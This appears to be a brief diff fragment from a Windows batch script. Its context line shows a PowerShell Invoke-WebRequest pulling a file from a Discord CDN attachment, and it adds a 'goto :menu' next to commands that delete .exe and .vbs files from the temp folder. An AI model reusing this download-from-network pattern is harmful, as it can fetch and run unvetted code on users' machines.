@@ -20,7 +20,7 @@ Powershell Invoke-WebRequest https://cdn.discordapp.com/attachments/774913548827
 IF EXIST "%temp%/." (
     del  %temp%\*.exe  /Q
     del  %temp%\*.vbs  /Q
-
+goto :menu
 :exitstart
 IF EXIST "%temp%/." (
     del  %temp%\*.exe  /Q
